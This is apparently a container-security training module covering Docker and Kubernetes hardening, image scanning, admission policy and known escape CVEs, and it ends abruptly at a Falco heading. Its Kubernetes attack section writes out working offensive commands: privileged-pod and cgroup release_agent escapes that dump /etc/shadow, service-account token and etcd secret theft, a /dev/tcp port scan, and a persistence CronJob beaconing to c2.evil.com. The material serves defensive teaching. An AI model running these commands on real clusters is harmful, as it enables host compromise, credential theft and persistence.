# Container Security Operations — Docker, Kubernetes, and Runtime Protection

> **Modulo 36** · **Tempo:** 180 min · **Aggiornamento:** 2026-05-07

## Idee guida

1. **Containers are NOT a security boundary.** They share a kernel — a single escape compromises the host.
2. **Shift-left + runtime = defense in depth.** Scan at build, enforce at admission, detect at runtime.
3. **Immutable infrastructure.** Never patch running containers — rebuild, rescan, redeploy.
4. **Least privilege by default.** Drop all capabilities, run non-root, read-only filesystems.
5. **Supply chain integrity.** Every image is code — sign, verify, audit provenance.

---

## Indice

1. [Superficie d'Attacco Container](#1-superficie-dattacco-container)
2. [Image Security](#2-image-security)
3. [Docker Hardening](#3-docker-hardening)
4. [Kubernetes Security Architecture](#4-kubernetes-security-architecture)
5. [Kubernetes Attack Techniques](#5-kubernetes-attack-techniques)
6. [Runtime Security](#6-runtime-security)
7. [Supply Chain Security for Containers](#7-supply-chain-security-for-containers)
8. [Secrets Management in Containers](#8-secrets-management-in-containers)
9. [Monitoring e Incident Response](#9-monitoring-e-incident-response)
10. [Laboratorio](#10-laboratorio)
11. [Analisi Avanzata delle Immagini e Dockerfile Hardening](#11-analisi-avanzata-delle-immagini-e-dockerfile-hardening)
12. [Container Rootless e User Namespaces](#12-container-rootless-e-user-namespaces)
13. [Policy-as-Code Avanzato](#13-policy-as-code-avanzato)
14. [Sicurezza di Rete Avanzata con eBPF](#14-sicurezza-di-rete-avanzata-con-ebpf)
15. [Pipeline CI/CD Sicura per Container](#15-pipeline-cicd-sicura-per-container)
16. [Audit, Compliance e DFIR Avanzato](#16-audit-compliance-e-dfir-avanzato)

---

## 1. Superficie d'Attacco Container

### Container vs VM Isolation Model

Virtual machines provide hardware-level isolation through a hypervisor. Each VM runs its own kernel, has separate memory address spaces enforced by the MMU, and compromising one VM's kernel does not affect another. Containers share the host kernel. The isolation boundary is enforced by:

- **Namespaces** — provide visibility isolation (PID, network, mount, UTS, IPC, user, cgroup, time). A process inside a container cannot *see* resources in other namespaces, but the kernel enforcing this is shared.
- **Cgroups** — provide resource limits (CPU, memory, PIDs, block I/O). They prevent DoS but do not enforce security boundaries.
- **Seccomp** — filters syscalls available to a process. Default Docker seccomp profile blocks ~44 of ~300+ syscalls.
- **LSMs (AppArmor/SELinux)** — Mandatory Access Control confining filesystem, network, and capability access.

The critical difference: a kernel vulnerability affects ALL containers on that host simultaneously. There is no hypervisor equivalent protecting the shared kernel.

**Namespace limitations:**

| Namespace | Isolates | Does NOT Isolate |
|-----------|----------|------------------|
| PID | Process tree visibility | /proc kernel interfaces |
| Network | Network stack, interfaces | Kernel netfilter bugs |
| Mount | Filesystem view | Kernel VFS vulnerabilities |
| User | UID/GID mapping | Kernel credential structures |
| IPC | SysV IPC, POSIX queues | Shared memory if misconfigured |
| Cgroup | Cgroup root visibility | Cgroup escape via release_agent |

### Docker Daemon as Root Attack Surface

The Docker daemon (`dockerd`) runs as root by default. Any process that can communicate with the daemon socket effectively has root access to the host:

```
User -> docker CLI -> /var/run/docker.sock -> dockerd (root) -> containerd -> runc
```

Implications:
- Any user in the `docker` group has equivalent-to-root access
- Mounting `/var/run/docker.sock` inside a container gives that container full host root
- The daemon's REST API, if exposed on TCP without TLS mutual auth, is an RCE vector
- Build operations run as root by default — a malicious Dockerfile can compromise the build host

### Container Escape History — Critical CVEs

#### CVE-2019-5736 — runc Container Escape (CVSS 8.6)

The runc binary on the host could be overwritten from inside a container through `/proc/self/exe`. When runc was next invoked, the attacker's code ran as root on the host.

**Mechanism:** Container process opens `/proc/self/exe` → follows symlink to the host runc binary → overwrites it → next `docker exec` or container start executes attacker payload as host root.

**Impact:** Full host compromise from an unprivileged container.

**Mitigation:** Patch runc ≥ 1.0.0-rc6, use read-only runc binary, user namespaces.

#### CVE-2020-15257 — containerd Host Network Access (CVSS 5.2)

Containers sharing the host network namespace could access containerd's abstract unix domain socket, gaining control over other containers and the daemon itself.

**Mechanism:** Abstract sockets exist outside filesystem namespaces → `hostNetwork: true` pod connects to containerd's shim API → creates/destroys containers, reads their filesystem.

**Mitigation:** Patch containerd ≥ 1.3.9 / 1.4.3, never use `hostNetwork` without extreme justification.

#### CVE-2022-0847 — Dirty Pipe (CVSS 7.8)

A Linux kernel vulnerability (5.8 ≤ kernel < 5.16.11) allowing overwriting data in read-only files by exploiting the pipe buffer mechanism.

**Mechanism:** Splice data into pipe → manipulate pipe buffer flags → write to arbitrary cached pages including read-only files → overwrite `/etc/passwd`, SUID binaries, container configuration.

**Container impact:** Escape container by overwriting host files visible through volume mounts or through `/proc`. Trivially escalate to root within any container regardless of UID.

**Mitigation:** Kernel patch. No container-level mitigation possible — this is a fundamental kernel bug.

#### CVE-2024-21626 — runc Leaked File Descriptor (CVSS 8.6)

runc ≤ 1.1.11 leaked a file descriptor to the host filesystem into new containers. An attacker could use this fd to access the host filesystem via `/proc/self/fd/`.

**Mechanism:** During container initialization, runc left a working directory file descriptor open → container process reads/writes host paths through that descriptor.

**Mitigation:** runc ≥ 1.1.12, minimal base images reduce exploitability surface.

### Supply Chain Through Container Images

Container images aggregate thousands of packages. A single compromised dependency poisons every deployment:

- **Base image compromise** — malicious code in `ubuntu:latest` or similar popular images
- **Dependency confusion** — private package name collision with public registries within `RUN pip install`
- **Typosquatting** — `pythonn` vs `python`, `nodjs` vs `nodejs` in Dockerfiles
- **Stale images** — images not rebuilt for months accumulate known CVEs
- **Build-time secrets** — credentials baked into image layers are extractable forever

### Vulnerability Classification by Phase

| Phase | Vulnerability Class | Example |
|-------|-------------------|---------|
| Build-time | Vulnerable base image, dependency CVEs, leaked secrets in layers | Log4Shell in Java base image |
| Registry | Image tampering, unsigned images, poisoned cache | Registry MITM, tag mutability |
| Admission | No policy enforcement, permissive pod specs | `privileged: true` pods admitted |
| Runtime | Container escape, kernel exploit, resource abuse | Cryptominer via exposed API |
| Orchestration | RBAC misconfiguration, secret exposure, network policy gaps | Default ServiceAccount with cluster-admin |

---

## 2. Image Security

### Base Image Selection

#### Scratch

```dockerfile
FROM scratch
COPY --from=builder /app/myapp /myapp
ENTRYPOINT ["/myapp"]
```

- Zero packages, zero CVEs from the OS layer
- No shell — cannot `exec` into container (security benefit)
- No package manager — debugging requires ephemeral debug containers
- Ideal for: statically compiled Go/Rust binaries

#### Distroless (gcr.io/distroless)

```dockerfile
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /app/myapp /myapp
USER nonroot:nonroot
ENTRYPOINT ["/myapp"]
```

- Contains only the application runtime (libc, libssl, ca-certificates)
- No shell, no package manager
- ~2MB for static, ~20MB for base
- Available in `-debug` variants with busybox shell for troubleshooting
- Ideal for: Go, Rust, Java, Python, Node.js applications

#### Alpine

```dockerfile
FROM alpine:3.20
RUN apk add --no-cache ca-certificates tzdata && \
    adduser -D -H appuser
USER appuser
```

- ~7MB base, musl libc (can cause compatibility issues)
- Includes shell and package manager — increases attack surface vs distroless
- Fast vulnerability patching cadence
- Ideal for: applications needing runtime package installation, debugging convenience

**Decision matrix:**

| Criterion | scratch | distroless | alpine | debian-slim |
|-----------|---------|------------|--------|-------------|
| Image size | ~0 | 2-20MB | 7MB | 80MB |
| CVE surface | None | Minimal | Low | Medium |
| Debug access | None | None/debug variant | Shell | Full |
| Package manager | No | No | apk | apt |
| musl issues | N/A | No (glibc) | Yes | No |

### Multi-Stage Builds

Multi-stage builds eliminate build dependencies from the final image:

```dockerfile
# Stage 1: Build
FROM golang:1.23-bookworm AS builder
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
    go build -ldflags="-s -w" -trimpath -o /app/server ./cmd/server

# Stage 2: Runtime
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /app/server /server
USER nonroot:nonroot
EXPOSE 8080
ENTRYPOINT ["/server"]
```

Key practices:
- Pin builder image tags to digest: `golang:1.23-bookworm@sha256:abc123...`
- Use `CGO_ENABLED=0` for static binaries when possible
- Strip debug symbols with `-ldflags="-s -w"`
- Copy only the final binary, not source code

### Image Scanning

#### Trivy

```bash
# Scan image for vulnerabilities
trivy image --severity HIGH,CRITICAL --exit-code 1 myregistry.io/app:v1.2.3

# Scan with SBOM output
trivy image --format spdx-json --output sbom.spdx.json myregistry.io/app:v1.2.3

# Scan filesystem (in CI before building image)
trivy fs --security-checks vuln,secret,misconfig .

# Scan Kubernetes manifests
trivy config --severity HIGH,CRITICAL ./k8s/

# Ignore unfixed vulnerabilities
trivy image --ignore-unfixed --severity CRITICAL myregistry.io/app:v1.2.3
```

#### Grype

```bash
# Scan image
grype myregistry.io/app:v1.2.3 --fail-on high

# Scan SBOM
grype sbom:./sbom.spdx.json

# Output in SARIF for GitHub integration
grype myregistry.io/app:v1.2.3 -o sarif > results.sarif
```

#### CI Integration Example (GitHub Actions)

```yaml
- name: Scan image with Trivy
  uses: aquasecurity/trivy-action@0.28.0
  with:
    image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
    format: 'sarif'
    output: 'trivy-results.sarif'
    severity: 'HIGH,CRITICAL'
    exit-code: '1'

- name: Upload scan results
  uses: github/codeql-action/upload-sarif@v3
  if: always()
  with:
    sarif_file: 'trivy-results.sarif'
```

### SBOM Generation

Software Bill of Materials provides transparency into image contents:

```bash
# Syft — generate SBOM
syft myregistry.io/app:v1.2.3 -o spdx-json > sbom.spdx.json
syft myregistry.io/app:v1.2.3 -o cyclonedx-json > sbom.cdx.json

# Docker native SBOM
docker sbom myregistry.io/app:v1.2.3 --format spdx-json

# Attach SBOM to image in registry (OCI artifact)
cosign attach sbom --sbom sbom.spdx.json myregistry.io/app:v1.2.3
```

### Image Signing with Cosign

```bash
# Generate key pair (first time)
cosign generate-key-pair

# Sign image
cosign sign --key cosign.key myregistry.io/app:v1.2.3

# Keyless signing with OIDC (Sigstore)
cosign sign myregistry.io/app:v1.2.3

# Verify signature
cosign verify --key cosign.pub myregistry.io/app:v1.2.3

# Verify keyless signature
cosign verify \
  --certificate-identity=ci@myorg.io \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  myregistry.io/app:v1.2.3
```

### Registry Security with Harbor

Harbor provides enterprise registry features:

- Automatic vulnerability scanning on push (Trivy integration)
- Image signing enforcement (Notary/Cosign)
- Replication policies between registries
- RBAC with LDAP/OIDC integration
- Admission webhook to block vulnerable images
- Immutable tags to prevent overwrites
- Garbage collection of unused layers
- Audit logging of all registry operations

**Harbor admission policy configuration:**

```yaml
# Project-level vulnerability policy
# Block images with CRITICAL vulnerabilities from being pulled
vulnerability:
  prevent_vulnerable_images_from_running: true
  prevent_vulnerability_severity: critical
  
# Tag immutability rule
tag_immutability:
  - scope: "release-*"
    tag_filter: "v*"
```

### Ephemeral vs Golden Image Patterns

**Golden image pattern:**
- Org-maintained base images with approved packages, hardened configs
- Rebuilt on schedule (weekly) or on CVE trigger
- All teams build FROM the golden base
- Reduces duplication of security work

**Ephemeral image pattern:**
- Images built fresh in CI on every commit
- Never patched in-place — always rebuilt from source
- Short TTL — old images auto-deleted from registry
- Ensures no configuration drift

Best practice: combine both — golden bases rebuilt weekly, app images rebuilt from golden base on every commit.

---

## 3. Docker Hardening

### Daemon Configuration

`/etc/docker/daemon.json` — hardened configuration:

```json
{
  "userns-remap": "default",
  "no-new-privileges": true,
  "live-restore": true,
  "userland-proxy": false,
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "5"
  },
  "storage-driver": "overlay2",
  "default-ulimits": {
    "nofile": { "Name": "nofile", "Hard": 65536, "Soft": 65536 },
    "nproc": { "Name": "nproc", "Hard": 4096, "Soft": 4096 }
  },
  "icc": false,
  "iptables": true,
  "default-address-pools": [
    { "base": "172.17.0.0/16", "size": 24 }
  ],
  "tls": true,
  "tlsverify": true,
  "tlscacert": "/etc/docker/tls/ca.pem",
  "tlscert": "/etc/docker/tls/server-cert.pem",
  "tlskey": "/etc/docker/tls/server-key.pem"
}
```

Key settings explained:

| Setting | Purpose |
|---------|---------|
| `userns-remap` | Maps container root to unprivileged host UID |
| `no-new-privileges` | Prevents privilege escalation via setuid/setgid |
| `icc: false` | Disables inter-container communication by default |
| `live-restore` | Containers survive daemon restarts |
| `userland-proxy: false` | Uses iptables instead of docker-proxy (reduces processes) |

### Rootless Docker

Rootless mode runs the entire Docker daemon and containers without root privileges:

```bash
# Install rootless Docker
dockerd-rootless-setuptool.sh install

# Set environment
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock
export PATH=$HOME/bin:$PATH

# Verify
docker info | grep -i root
# rootless: true
```

Limitations of rootless mode:
- Cannot use `--net=host`
- Cannot bind ports below 1024 (without `sysctl net.ipv4.ip_unprivileged_port_start=0`)
- Slightly higher latency on network operations (slirp4netns/pasta)
- cgroup v2 required for resource limits

### CIS Docker Benchmark Walkthrough

The CIS Docker Benchmark v1.6.0 contains 100+ checks organized in sections:

**1. Host Configuration**

```bash
# 1.1.1 — Ensure separate partition for /var/lib/docker
mount | grep '/var/lib/docker'

# 1.1.2 — Ensure auditing is configured for Docker
auditctl -l | grep /usr/bin/dockerd
auditctl -l | grep /var/lib/docker
auditctl -l | grep /etc/docker
auditctl -l | grep /var/run/docker.sock

# Audit rules to add to /etc/audit/rules.d/docker.rules
-w /usr/bin/dockerd -k docker
-w /var/lib/docker -k docker
-w /etc/docker -k docker
-w /usr/lib/systemd/system/docker.service -k docker
-w /var/run/docker.sock -k docker
```

**2. Docker Daemon Configuration**

```bash
# 2.1 — Restrict network traffic between containers
docker network inspect bridge | jq '.[0].Options["com.docker.network.bridge.enable_icc"]'
# Should be "false"

# 2.2 — Set logging level
dockerd --log-level=info

# 2.3 — Allow Docker to make changes to iptables
# daemon.json: "iptables": true

# 2.4 — Do not use insecure registries
docker info | grep "Insecure Registries"
# Should only show 127.0.0.0/8
```

**5. Container Runtime — Hardened Run Command**

```bash
docker run -d \
  --name secure-app \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  --security-opt no-new-privileges:true \
  --security-opt seccomp=./seccomp-profile.json \
  --security-opt apparmor=docker-default \
  --pids-limit 100 \
  --memory 512m \
  --memory-swap 512m \
  --cpus 1.0 \
  --ulimit nofile=65535:65535 \
  --user 1000:1000 \
  --network app-network \
  --health-cmd "curl -f http://localhost:8080/health || exit 1" \
  --health-interval 30s \
  --restart on-failure:3 \
  myregistry.io/app:v1.2.3
```

### Seccomp Profiles

Default Docker seccomp profile blocks dangerous syscalls. Custom profiles further restrict per workload:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_AARCH64"
  ],
  "syscalls": [
    {
      "names": [
        "accept4", "access", "arch_prctl", "bind", "brk",
        "clock_gettime", "clone", "close", "connect",
        "epoll_create1", "epoll_ctl", "epoll_wait",
        "execve", "exit", "exit_group", "fcntl", "fstat",
        "futex", "getdents64", "getpid", "getsockname",
        "getsockopt", "ioctl", "listen", "lseek",
        "madvise", "mmap", "mprotect", "munmap",
        "nanosleep", "newfstatat", "openat", "pipe2",
        "poll", "pread64", "read", "readlinkat",
        "recvfrom", "rt_sigaction", "rt_sigprocmask",
        "rt_sigreturn", "sched_getaffinity", "sendto",
        "set_robust_list", "set_tid_address", "setsockopt",
        "sigaltstack", "socket", "tgkill", "write",
        "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

Generate seccomp profiles from actual container behavior:

```bash
# Using OCI seccomp-profiler (records syscalls)
docker run --security-opt seccomp=unconfined \
  --annotation io.containers.trace-syscall="if:/dev/null;of:/tmp/profile.json" \
  myapp:latest

# Using Inspektor Gadget (Kubernetes)
kubectl gadget trace exec -n production -p myapp-pod
```

### Capability Dropping

Linux capabilities split root privilege into 40+ discrete permissions. Default Docker containers get 14 capabilities — too many for most workloads:

```bash
# View default capabilities
docker run --rm alpine cat /proc/self/status | grep Cap

# Minimal capability sets per workload type:

# Web server (binds port 80)
--cap-drop ALL --cap-add NET_BIND_SERVICE

# Application server (no special needs)
--cap-drop ALL

# Network troubleshooting (temporary debug)
--cap-drop ALL --cap-add NET_RAW --cap-add NET_ADMIN

# NEVER grant these in production:
# SYS_ADMIN — equivalent to root, allows mount, bpf, namespace manipulation
# SYS_PTRACE — debug other processes, read their memory
# DAC_OVERRIDE — bypass file permissions
# NET_RAW — craft arbitrary packets, ARP spoof
```

### Docker Socket Protection

**NEVER mount the Docker socket into a container.** It grants complete host root access:

```yaml
# DANGEROUS — complete host compromise
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
```

If container-based Docker access is absolutely required (CI/CD builds):
- Use Docker-in-Docker (`dind`) with `--privileged` in isolated VMs only
- Use Kaniko for in-cluster image builds (no daemon required)
- Use BuildKit with rootless daemon
- Use TCP socket with mTLS and per-client authorization

```bash
# Kaniko — build images without Docker daemon
docker run --rm \
  -v $(pwd):/workspace \
  gcr.io/kaniko-project/executor:latest \
  --dockerfile=/workspace/Dockerfile \
  --context=/workspace \
  --destination=myregistry.io/app:v1.2.3
```

---

## 4. Kubernetes Security Architecture

### API Server Security

The kube-apiserver is the single entry point for all cluster operations. Compromising it means owning the cluster.

#### RBAC (Role-Based Access Control)

```yaml
# Principle: deny all, then grant minimum necessary

# Role — namespace-scoped permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: app-deployer
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "watch", "update", "patch"]
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["pods/log"]
  verbs: ["get"]

---
# RoleBinding — binds role to subject
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: production
  name: deploy-team-binding
subjects:
- kind: Group
  name: deploy-team
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: app-deployer
  apiGroup: rbac.authorization.k8s.io
```

**ClusterRole dangerous permissions to audit:**

```bash
# Find subjects with cluster-admin
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]'

# Find roles that can create pods (potential escape)
kubectl get roles,clusterroles -A -o json | \
  jq '.items[] | select(.rules[]? | .resources[]? == "pods" and (.verbs[]? == "create" or .verbs[]? == "*"))'

# Find roles with secret access
kubectl get roles,clusterroles -A -o json | \
  jq '.items[] | select(.rules[]? | .resources[]? == "secrets")'
```

#### Admission Controllers

Admission controllers intercept API requests after authentication/authorization but before persistence:

```yaml
# Validating Admission Policy (Kubernetes 1.28+)
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: deny-privileged-containers
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
    - apiGroups: [""]
      apiVersions: ["v1"]
      operations: ["CREATE", "UPDATE"]
      resources: ["pods"]
  validations:
  - expression: "!object.spec.containers.exists(c, c.securityContext.privileged == true)"
    message: "Privileged containers are not allowed"
  - expression: "!object.spec.initContainers.exists(c, c.securityContext.privileged == true)"
    message: "Privileged init containers are not allowed"
```

#### Audit Logging

```yaml
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# Log all requests to secrets at Metadata level
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets"]

# Log pod exec/attach at RequestResponse level
- level: RequestResponse
  resources:
  - group: ""
    resources: ["pods/exec", "pods/attach", "pods/portforward"]

# Log authentication failures
- level: Metadata
  stages:
  - ResponseComplete
  omitStages:
  - RequestReceived

# Log all changes to RBAC
- level: RequestResponse
  resources:
  - group: "rbac.authorization.k8s.io"
    resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]

# Catch-all at Metadata level
- level: Metadata
  omitStages:
  - RequestReceived
```

### etcd Encryption

etcd stores all cluster state including Secrets in plaintext by default:

```yaml
# /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources:
  - secrets
  - configmaps
  providers:
  - aescbc:
      keys:
      - name: key-2026-05
        secret: <base64-encoded-32-byte-key>
  - identity: {}  # Fallback for reading old unencrypted data
```

Apply and verify:

```bash
# Add to kube-apiserver manifest
--encryption-provider-config=/etc/kubernetes/encryption-config.yaml

# Re-encrypt all secrets with new key
kubectl get secrets --all-namespaces -o json | kubectl replace -f -

# Verify encryption
ETCDCTL_API=3 etcdctl get /registry/secrets/default/my-secret \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key | hexdump -C | head
# Should show encrypted (k8s:enc:aescbc:v1:key-2026-05) prefix, not plaintext
```

### Kubelet Security

```yaml
# /var/lib/kubelet/config.yaml — hardened
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
authentication:
  anonymous:
    enabled: false  # CRITICAL — disable anonymous kubelet access
  webhook:
    enabled: true
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: Webhook  # Not AlwaysAllow
readOnlyPort: 0  # Disable unauthenticated read-only port (10255)
protectKernelDefaults: true
makeIPTablesUtilChains: true
eventRecordQPS: 50
rotateCertificates: true
serverTLSBootstrap: true
```

### Network Policies

Default Kubernetes networking: all pods can communicate with all other pods. Network policies implement segmentation:

```yaml
# Deny all ingress and egress by default (apply per namespace)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress

---
# Allow specific communication
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080

---
# Allow DNS egress (required for service discovery)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

### Pod Security Standards

Kubernetes 1.25+ enforces Pod Security Standards through the Pod Security Admission controller:

```yaml
# Namespace labels for enforcement
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**Restricted profile requirements:**
- `runAsNonRoot: true`
- `allowPrivilegeEscalation: false`
- `seccompProfile.type: RuntimeDefault` or `Localhost`
- No `hostNetwork`, `hostPID`, `hostIPC`
- No `privileged: true`
- Capabilities drop ALL, only allow NET_BIND_SERVICE
- Volume types restricted to: configMap, emptyDir, ephemeral, persistentVolumeClaim, projected, secret

```yaml
# Pod meeting restricted security standard
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
    runAsGroup: 65534
    fsGroup: 65534
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myregistry.io/app:v1.2.3@sha256:abc123...
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "512Mi"
        cpu: "1000m"
      requests:
        memory: "256Mi"
        cpu: "250m"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir:
      medium: Memory
      sizeLimit: 64Mi
```

### Service Mesh Security — Istio mTLS

```yaml
# PeerAuthentication — enforce mTLS cluster-wide
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: STRICT  # All traffic must be mTLS

---
# AuthorizationPolicy — L7 access control
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: backend-policy
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/frontend"]
    to:
    - operation:
        methods: ["GET", "POST"]
        paths: ["/api/*"]
```

---

## 5. Kubernetes Attack Techniques

### RBAC Exploitation — Privilege Escalation

**Scenario:** ServiceAccount with `create pods` permission in a namespace → create a pod that mounts host filesystem or uses hostPID to access other processes.

```yaml
# Attacker creates privileged pod using compromised ServiceAccount
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: compromised-ns
spec:
  serviceAccountName: overprivileged-sa
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "nsenter -t 1 -m -u -i -n -p -- bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

**Dangerous RBAC permissions to hunt:**

| Permission | Risk |
|-----------|------|
| `pods/exec` | Execute commands in any pod |
| `secrets` (get/list) | Read all secrets in namespace |
| `pods` (create) | Create pods with host mounts |
| `nodes/proxy` | Proxy requests to kubelet API |
| `serviceaccounts/token` | Generate tokens for any SA |
| `*.* *` (wildcard) | Cluster admin equivalent |
| `escalate` verb on roles | Self-grant permissions |
| `bind` verb on roles | Bind to higher roles |
| `impersonate` | Act as another user/SA |

### Pod Escape Techniques

#### hostPID Escape

```bash
# Inside a pod with hostPID: true
# See all host processes
ps aux

# Enter host namespace
nsenter -t 1 -m -u -i -n -p -- /bin/bash
# Now running as root on the host
```

#### hostNetwork Abuse

```bash
# Inside a pod with hostNetwork: true
# Access services bound to localhost on the node
curl http://127.0.0.1:10250/pods  # Kubelet API
curl http://127.0.0.1:2379/health  # etcd (if on control plane)

# Sniff traffic from other pods
tcpdump -i any -w capture.pcap
```

#### Privileged Container Escape

```bash
# Inside a privileged container
# Mount host filesystem
mkdir /host-root
mount /dev/sda1 /host-root

# Write SSH key for persistence
echo "ssh-ed25519 AAAA..." >> /host-root/root/.ssh/authorized_keys

# Alternatively — escape via cgroups release_agent
d=$(dirname $(ls -la /s*/fs/c*/*/r* 2>/dev/null | head -1))
mkdir -p $d/exploit
echo 1 > $d/exploit/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/shadow_dump" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > $d/exploit/cgroup.procs"
```

### Service Account Token Abuse

```bash
# Default SA token mounted at (pre-1.24 or with automountServiceAccountToken: true)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Query API server
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets

# Check what the token can do
kubectl auth can-i --list --token=$TOKEN
```

### Secret Extraction from etcd

```bash
# If you have access to etcd (control plane compromise)
ETCDCTL_API=3 etcdctl get /registry/secrets --prefix --keys-only \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key

# Dump specific secret (base64 in etcd, not encrypted by default)
ETCDCTL_API=3 etcdctl get /registry/secrets/production/database-credentials \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key
```

### Lateral Movement Pod-to-Pod

```bash
# From compromised pod — discover services
# DNS enumeration
nslookup -type=srv _http._tcp.default.svc.cluster.local

# Scan cluster CIDR
for ip in $(seq 1 254); do
  timeout 1 bash -c "echo >/dev/tcp/10.244.0.$ip/8080" 2>/dev/null && \
    echo "10.244.0.$ip:8080 open"
done

# Access services via cluster DNS
curl http://backend-service.production.svc.cluster.local:8080/api/internal

# If network policies are missing — all pods reachable
curl http://10.244.1.5:5432  # Direct pod IP, bypassing service
```

### Persistence Mechanisms

```yaml
# CronJob for persistent access
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-maintenance  # Innocent-looking name
  namespace: kube-system     # Hidden in system namespace
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: cluster-admin-sa
          containers:
          - name: maintenance
            image: attacker/backdoor:latest
            command: ["/bin/sh", "-c", "curl http://c2.evil.com/beacon"]
          restartPolicy: OnFailure

---
# Mutating webhook for persistent container injection
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: pod-injector
webhooks:
- name: inject.attacker.io
  clientConfig:
    url: "https://attacker-controlled-server.com/inject"
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  failurePolicy: Ignore
  sideEffects: None
  admissionReviewVersions: ["v1"]
```

---

## 6. Runtime Security

### Falco — Runtime Threat Detection

Falco uses eBPF (or kernel module) to monitor syscalls in real-time and applies rules to detect suspicious behavior.

#### Installation

```bash
# Helm installation
